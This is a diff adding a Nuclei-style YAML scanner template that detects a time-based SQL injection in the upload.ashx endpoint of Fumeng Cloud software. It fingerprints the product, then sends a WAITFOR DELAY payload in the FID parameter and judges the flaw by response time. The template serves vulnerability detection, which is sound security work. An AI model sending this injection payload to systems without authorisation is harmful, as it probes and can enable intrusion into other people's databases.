@@ -1,0 +1,48 @@
+id: poc-yaml-fumasoft-upload-ashx-sqli
+info:
+  name: Fumeng Cloud upload.ashx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template checks for an SQL injection vulnerability in the upload.ashx endpoint of Fumeng Cloud software.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "孚盟云"
+
+  - raw:
+      - |
+        GET /Ajax/upload.ashx?action=showImgss&FID=1'WAITFOR%20DELAY'0:0:{{t1}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: kval
+        kval:
+          - content_type
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "image/jpeg"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
